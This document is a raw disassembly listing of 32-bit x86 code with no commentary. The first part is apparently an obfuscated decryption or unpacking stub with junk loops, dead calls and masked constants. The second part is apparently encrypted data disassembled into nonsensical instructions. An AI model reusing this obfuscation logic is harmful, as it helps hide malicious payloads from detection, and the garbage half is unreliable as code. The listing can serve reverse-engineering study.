  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237f2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a96
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423948
  41c5ea:	push   0x4238ad
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423923
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42390e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a44
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x77d7ebdc
  41ccad:	mov    ds,ebx
  41ccaf:	lea    edx,[edi+0x3c6261fc]
  41ccb5:	pop    edi
  41ccb6:	bound  esp,QWORD PTR [edx+0x60]
  41ccb9:	push   ecx
  41ccba:	add    bh,BYTE PTR [edi+eiz*1]
  41ccbd:	sbb    DWORD PTR [eax],0xffffffce
  41ccc0:	pop    esp
  41ccc1:	xor    eax,0x8635245e
  41ccc6:	pop    eax
  41ccc7:	into   
  41ccc8:	push   ecx
  41ccc9:	cs xor al,al
  41cccc:	sbb    DWORD PTR [edi+0x649b6639],eax
  41ccd2:	jle    0x41ccca
  41ccd4:	mov    ch,0xfb
  41ccd6:	xor    edx,esp
  41ccd8:	sbb    BYTE PTR [eax-0x262301bc],0xb8
  41ccdf:	into   
  41cce0:	sub    DWORD PTR [ebp-0x660e132e],esi
  41cce6:	cld    
  41cce7:	fdiv   QWORD PTR ds:[edi+0x16]
  41cceb:	fcmovu st,st(5)
  41cced:	xchg   edx,eax
  41ccee:	jmp    FWORD PTR [ecx]
  41ccf0:	sahf   
  41ccf1:	enter  0x89a7,0x57
  41ccf5:	sub    WORD PTR [esi+edx*1+0x4b42447],si
  41ccfd:	xor    BYTE PTR [ecx+esi*8+0x3b],dl
  41cd01:	fnstcw WORD PTR [esi+eiz*2]
  41cd04:	dec    esp
  41cd05:	adc    BYTE PTR [ebx],cl
  41cd07:	stos   DWORD PTR es:[edi],eax
  41cd08:	mov    ebx,ebx
  41cd0a:	sub    al,0xd0
  41cd0c:	bound  ebx,QWORD PTR [ecx+0x3f]
  41cd0f:	nop
  41cd10:	ja     0x41cd89
  41cd12:	dec    ecx
  41cd13:	ret    
  41cd14:	clc    
  41cd15:	(bad)  
  41cd16:	inc    ebx
  41cd17:	push   cs
  41cd18:	mov    WORD PTR cs:[esi],es
  41cd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd1c:	cmp    al,0xaf
  41cd1e:	test   BYTE PTR [eax-0x15],0x49
  41cd22:	rcr    DWORD PTR [eax],1
  41cd24:	mov    ds:0x2691ea1c,eax
  41cd29:	out    0x70,al
  41cd2b:	test   edx,ebp
  41cd2d:	pop    esi
  41cd2e:	imul   eax,DWORD PTR [edx],0xc2b692d7
  41cd34:	or     BYTE PTR [esi+ebp*4+0x19],0xf
  41cd39:	jbe    0x41cd7d
  41cd3b:	adc    dl,cl
  41cd3d:	xor    al,0x64
  41cd3f:	add    DWORD PTR [ecx+0x8067df3],ebx
  41cd45:	push   ebp
  41cd46:	test   BYTE PTR [ecx-0x769dcd0e],cl
  41cd4c:	fcmovne st,st(6)
  41cd4e:	lods   al,BYTE PTR ds:[esi]
  41cd4f:	sbb    ebp,DWORD PTR [ebx-0x4f]
  41cd52:	or     ch,BYTE PTR [esi+0x2f]
  41cd55:	rcl    DWORD PTR [ebp+esi*1+0x7a],cl
  41cd59:	rcr    DWORD PTR [ecx+0x34],cl
  41cd5c:	xor    BYTE PTR [ecx+0x4cc8cad],al
  41cd62:	cmp    DWORD PTR [eax-0x3ef5650b],ebx
  41cd68:	mov    edx,ebp
  41cd6a:	hlt    
  41cd6b:	jne    0x41cd7c
  41cd6d:	jecxz  0x41cd63
  41cd6f:	mov    edi,0xe0d01e8
  41cd74:	inc    esi
  41cd75:	(bad)  
  41cd76:	xlat   BYTE PTR ds:[ebx]
  41cd77:	pop    edi
  41cd78:	cs or  edi,ebx
  41cd7b:	jg     0x41cd3f
  41cd7d:	push   edi
  41cd7e:	(bad)  
  41cd7f:	and    DWORD PTR [eax-0x5c],ebx
  41cd82:	repnz out dx,al
  41cd84:	cmp    BYTE PTR [ebx-0x2d],ah
  41cd87:	cwde   
  41cd88:	cmp    bl,BYTE PTR [edi]
  41cd8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd8b:	(bad)  
  41cd8d:	sbb    al,0xdb
  41cd8f:	jae    0x41cd3f
  41cd91:	mov    bh,0xe5
  41cd93:	adc    BYTE PTR [esi],bl
  41cd95:	enter  0xc9e0,0x30
  41cd99:	sub    eax,0x1586155
  41cd9e:	xor    al,0xe5
  41cda0:	xor    eax,0xe1f8745b
  41cda5:	adc    al,0xe5
  41cda7:	jno    0x41cd72
  41cda9:	cmp    BYTE PTR [ebx-0x112f5f52],bl
  41cdaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdb0:	xchg   ecx,eax
  41cdb1:	push   ds
  41cdb2:	out    dx,al
  41cdb3:	push   ebp
  41cdb4:	fldcw  WORD PTR [eax+0x1d468ad4]
  41cdba:	scas   al,BYTE PTR es:[edi]
  41cdbb:	or     eax,DWORD PTR [esi+0x655dd96c]
  41cdc1:	add    ch,BYTE PTR [eax+eax*1]
  41cdc4:	push   ebp
  41cdc5:	retf   
  41cdc6:	inc    edi
  41cdc7:	out    dx,eax
  41cdc8:	jo     0x41cdff
  41cdca:	add    dl,BYTE PTR [edi-0x68e84635]
  41cdd0:	rol    DWORD PTR ds:0xfbe245ab,0x5b
  41cdd7:	adc    eax,0xbbfa5528
  41cddc:	in     al,0x2c
  41cdde:	xor    al,0xda
  41cde0:	loop   0x41cdf2
  41cde2:	or     esp,edx
  41cde4:	ins    BYTE PTR es:[edi],dx
  41cde5:	jmp    0x41cde6
  41cde7:	adc    ebp,DWORD PTR [edi-0x6a]
  41cdea:	xchg   edx,eax
  41cdeb:	pop    es
  41cdec:	mov    al,0x8d
  41cdee:	xchg   ecx,eax
  41cdef:	sub    BYTE PTR [edx-0x7ac61ea9],0x9f
  41cdf6:	cdq    
  41cdf7:	repnz int 0x83
  41cdfa:	push   esp
  41cdfb:	inc    eax
  41cdfc:	mov    WORD PTR [edi],fs
  41cdfe:	add    dl,bl
  41ce00:	inc    ebx
  41ce01:	dec    edi
  41ce02:	jge    0x41ce5b
  41ce04:	fwait
  41ce05:	sbb    eax,0x4b2225de
  41ce0a:	loopne 0x41ce2d
  41ce0c:	ror    BYTE PTR [edi+0x6],cl
  41ce0f:	scas   eax,DWORD PTR es:[edi]
  41ce10:	jae    0x41cdd8
  41ce12:	ins    DWORD PTR es:[edi],dx
  41ce13:	imul   esp,DWORD PTR [esp+edi*1-0x733e468a],0xffffffb0
  41ce1b:	mov    edx,0x14aa7efb
  41ce20:	push   ss
  41ce21:	sbb    DWORD PTR [esi+0x4b],esp
  41ce24:	add    ah,0x90
  41ce27:	nop
  41ce28:	clc    
  41ce29:	aam    0x8
  41ce2b:	repnz xor BYTE PTR [eax+ecx*2],bh
  41ce2f:	out    0x18,eax
  41ce31:	sti    
  41ce32:	cmp    edi,ebp
  41ce34:	xchg   ebx,eax
  41ce35:	ins    DWORD PTR es:[edi],dx
  41ce36:	scas   al,BYTE PTR es:[edi]
  41ce37:	or     BYTE PTR [edx-0x7ef64c32],ch
  41ce3d:	cmp    DWORD PTR [eax-0x2515399b],ebp
  41ce43:	mov    ebp,0x4e383393
  41ce48:	adc    esi,DWORD PTR [ebx]
  41ce4a:	inc    edi
  41ce4b:	inc    ebp
  41ce4c:	rcr    BYTE PTR [ecx-0xb],cl
  41ce4f:	fistp  DWORD PTR ds:0xbd6a1469
  41ce55:	fidiv  DWORD PTR [bp+0x2099]
  41ce5a:	xchg   DWORD PTR [edx-0x6a],edx
  41ce5d:	or     edi,DWORD PTR [edi]
  41ce5f:	mov    eax,esp
  41ce61:	clc    
  41ce62:	sbb    dl,BYTE PTR [edx+0x67]
  41ce65:	test   al,0x87
  41ce67:	nop
  41ce68:	push   0xfffffffc
